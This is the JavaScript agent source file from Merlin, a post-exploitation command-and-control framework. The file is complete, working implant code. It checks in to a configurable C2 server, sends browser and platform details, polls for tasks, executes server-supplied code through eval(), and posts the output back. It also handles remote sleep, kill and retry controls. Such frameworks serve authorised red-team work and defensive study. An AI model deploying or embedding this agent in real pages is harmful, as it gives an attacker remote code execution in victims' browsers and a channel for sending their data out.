// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

// Global Variables
var debug = false;
var verbose = true;
var initial = true;
var hostUUID = guid();
var version = "0.6.3.BETA";
var build = "nonRelease";
var waitTime = 30000; // in milliseconds
var maxRetry = 7;
var paddingMax = 4096;
var failedCheckin = 0;
var url = "https://127.0.0.1:443/";
var log = document.getElementById("merlinLog");
var options = {localeMatcher: "lookup", year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric',
    minute: 'numeric', second: 'numeric'};

if (debug){console.log("Starting Merlin JavaScript Agent")}

//https://stackoverflow.com/questions/105034/create-guid-uuid-in-javascript
function guid() {
    return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
        s4() + '-' + s4() + s4() + s4();
}

function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
        .toString(16)
        .substring(1);
}

// Base Message
var b = {
    "version": version,
    "id": hostUUID,
    "type": null,
    "padding": "RandomDataGoesHere", // TODO Not implemented yet
    "payload": null
};

// SysInfo Message
var s = {
    "platform": navigator.platform,
    "architecture": navigator.appCodeName,
    "username": navigator.userAgent,
    "userguid": navigator.appVersion,
    "hostname": document.title
};

function initialCheckIn (){
    if (debug){console.log("[DEBUG]Entering into initialCheckIn function")}
    var x = new XMLHttpRequest();
    var a = {
        "version": version,
        "build": build,
        "waittime": (waitTime.toString())+ "ms", // TODO fix hard coding the duration to milliseconds with ms
        "paddingmax": paddingMax,
        "maxretry": maxRetry,
        "failedcheckin": failedCheckin,
        // "skew": "", TODO implement skew
        "proto": "h2",
        "sysinfo": s
    };
    b.type = "InitialCheckIn";
    b.payload = a;
    if (verbose){verboseMessage("note", "Connecting to web server at " + url + " for initial check in.")}
    x.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            initial = false;
            failedCheckin = 0;
        }
    };
    x.open('POST', url, true);
    x.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
    if (debug){console.log("[DEBUG]Sending InitialCheckIn XHR")}
    x.onerror = function(e) {
        failedCheckin++;
        verboseMessage("warn", failedCheckin + " out of " + maxRetry + " total failed checkins");
        if (debug){
            console.log("[DEBUG]initialCheckIn POST request error:");
            console.log(e)
        }
    };
    if (debug){
        console.log("[DEBUG]Sending initialCheckIn XHR payload:");
        console.log(b)
    }
    x.send(JSON.stringify(b));
}

function agentInfo (){
    if (debug){console.log("[DEBUG]Entering into agentInfo function")}
    var x = new XMLHttpRequest();
    var a = {
        "version": version,
        "build": build,
        "waittime": (waitTime.toString())+ "ms", // TODO fix hard coding the duration to milliseconds with ms
        "paddingmax": paddingMax,
        "maxretry": maxRetry,
        "failedcheckin": failedCheckin,
        "proto": "h2",
        "sysinfo": s
    };
    b.type = "AgentInfo";
    b.payload = a;
    if (verbose){verboseMessage("note", "Connecting to web server at " + url + " to update agent configuration " +
        "information.")}
    x.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            main();
        }
    };
    x.open('POST', url, true);
    x.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
    if (debug){
        console.log("[DEBUG]Sending AgentInfo XHR:");
        console.log(b);
    }
    x.send(JSON.stringify(b));
}

function statusCheckIn (){
    if (debug){console.log("[DEBUG]Entering into statusCheckIn function")}
    var x = new XMLHttpRequest();
    b.type = "StatusCheckIn";
    x.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            failedCheckin = 0;
            var j = JSON.parse(x.responseText);
            processJSON(j.type, j);
        }
    };
    if (verbose){verboseMessage("note", "Connecting to web server at " + url + " for status check in.")}
    x.open('POST', url, true);
    x.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
    if (debug){console.log("[DEBUG]Sending StatusCheckIn XHR")}
    x.onerror = function(e) {
        failedCheckin++;
        verboseMessage("warn", failedCheckin + " out of " + maxRetry + " total failed checkins");
        verboseMessage("warn", "Error: " + e.message)
    };
    x.send(JSON.stringify(b));
}

function cmdResults(job, stdOut, stdErr){
    if (debug){console.log("[DEBUG]Entering into cmdResults function")}
    var x = new XMLHttpRequest();
    var p = {
        "job": job,
        "stdout": stdOut,
        "stderr": stdErr
    };
    b.type = "CmdResults";
    b.payload = p;
    if (verbose){verboseMessage("note", "Connecting to web server at " + url + " for CmdResults message.")}
    x.open('POST', url, true);
    x.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
    if (debug){console.log("[DEBUG]Sending cmdResults XHR")}
    x.onerror = function(e) {
        verboseMessage("warn", "There was an error sending the CmdResults message.");
        verboseMessage("warn", "Error: " + e.message)
    };
    x.send(JSON.stringify(b));
}

function verboseMessage(type, message){
    if (debug){console.log("[DEBUG]Entering into verboseMessage function")}
    if (verbose && log != null){
        switch (type){
            case "success":
                log.insertAdjacentHTML("beforeend", "<div style=\"color:lawngreen;\">[+]" + message + "</div>");
                break;
            case "note":
                log.insertAdjacentHTML("beforeend", "<div style=\"color:yellow;\">[-]" + message + "</div>");
                break;
            case "warn":
                log.insertAdjacentHTML("beforeend", "<div style=\"color:orangered;\">[!]" + message + "</div>");
                break;
            default:
                log.insertAdjacentHTML("beforeend", "<div style=\"color:red;\">[!]Unrecognized message type: " + type +
                    "<br>Message: " +  message + "</div>");
                break;
        }
    }
}

function processJSON(type, json){
    if (debug){console.log("[DEBUG]Entering into processJSON function")}
    verboseMessage("success", type + " message type received!");
    switch (type){
        case "ServerOk":
            break;
        case "CmdPayload":
            verboseMessage("note", "Executing command: " + json.payload['executable'] + " " + json.payload['args']);
            var stdOut;
            var stdErr;
            try {
                stdOut = eval(json.payload['executable'] + " " + json.payload['args']);
                if (typeof stdOut == "undefined") {
                    stdOut = "JavaScript command completed successfully and returned type 'undefined'"
                } else {
                    stdOut = stdOut.toString();
                }
                stdErr = "";
                verboseMessage("success", "Command output: " + stdOut);
            } catch (e){
                stdErr = e.toString();
                verboseMessage("warn", "There was an error processing the command: " + stdErr);
                stdOut = "";
            }
            cmdResults(json.payload['job'], stdOut, stdErr);
            break;
        case "AgentControl":
            switch (json.payload["command"]){
                case "kill":
                    verboseMessage("warn", "Received Agent Kill Message");
                    clearInterval(run);
                    //cmdResults(json.payload['job'],"Agent " + hostUUID + " successfully killed.", "");
                    break;
                case "sleep":
                    verboseMessage("note", "Setting agent sleep time to " + json.payload["args"] + " milliseconds");
                    var i = parseInt(json.payload["args"]);
                    if (!isNaN(i)){
                        waitTime = i;
                        cmdResults(json.payload['job'],"Agent sleep successfully set to " + waitTime +
                            " milliseconds.", "");
                        agentInfo();
                    } else {
                        verboseMessage("warn", "There was an error setting sleep to " + json.payload["args"]);
                        cmdResults(json.payload['job'],"","Setting agent sleep time failed.");
                    }
                    break;
                case "initialize":
                    verboseMessage("note", "Received agent re-initialize message");
                    initial = true;
                    break;
                case "maxretry":
                    verboseMessage("note","Setting agent max retries to " + json.payload["args"]);
                    var i = parseInt(json.payload["args"]);
                    if (!isNaN(i)){
                        maxRetry = i;
                        cmdResults(json.payload['job'],"Agent maxretry successfully set to " + maxRetry + ".", "");
                        agentInfo();
                    } else {
                        verboseMessage("warn", "There was an error setting max retries to " + json.payload["args"]);
                        cmdResults(json.payload['job'],"","Setting agent maxretry failed.");
                    }
                    break;
                case "padding":
                    verboseMessage("note", "Setting agent message maximum padding size to " + json.payload["args"]);
                    var i = parseInt(json.payload["args"]);
                    if (!isNaN(i)){
                        paddingMax = i;
                        cmdResults(json.payload['job'],"Agent padding max successfully set to " + paddingMax +
                            " bytes.", "");
                        agentInfo();
                    } else {
                        verboseMessage("warn", "There was an error setting padding max to " + json.payload["args"]);
                        cmdResults(json.payload['job'],"","Setting agent padding max failed.");
                    }
                    break;
                default:
                    verboseMessage("warn", "Unknown AgentControl control type: " + json.payload["command"]);
                    cmdResults(json.payload['job'],"","Unknown AgentControl control type: " + json.payload["command"]);
                    break;
            }
            break;
        case "FileTransfer":
            cmdResults(json.payload['job'],"","File transfer has not been implemented in the JavaScript Agent!");
            break;
        default:
            verboseMessage("warn", "Unknown message type: " + type);
            cmdResults(json.payload['job'],"","Unknown message type: " + type);
            break;
    }
}

function main(){
    if (debug){console.log("[DEBUG]Entering into main function")}
    if (failedCheckin < maxRetry) {
        if (initial) {
            initialCheckIn();
        } else if (!initial) {
            statusCheckIn();
        }
    } else if (failedCheckin == maxRetry){
        verboseMessage("warn", "Max retries of " + maxRetry + " reached, shutting down the agent.");
        clearInterval(run);
        return;
    }
    if (verbose){var today  = new Date();verboseMessage("note", "Sleeping for " + waitTime + " milliseconds at " +
        today.toLocaleString("en-US", options))}
}

// Check for override URL
if (typeof oURL == 'string'){url=oURL}

if (verbose){
    verboseMessage("success", "Starting Merlin JavaScript Agent");
    verboseMessage("note", "Agent version: " + version);
    verboseMessage("note", "Agent build: " + build);
    verboseMessage("note", "Agent UUID: " + hostUUID);
    verboseMessage("note", "Platform: " + navigator.appCodeName);
    verboseMessage("note", "Architecture: " + navigator.platform);
    verboseMessage("note", "User Name: " + navigator.userAgent);
    verboseMessage("note", "User GUID: " + navigator.appVersion);
}

var run = setInterval(main, waitTime);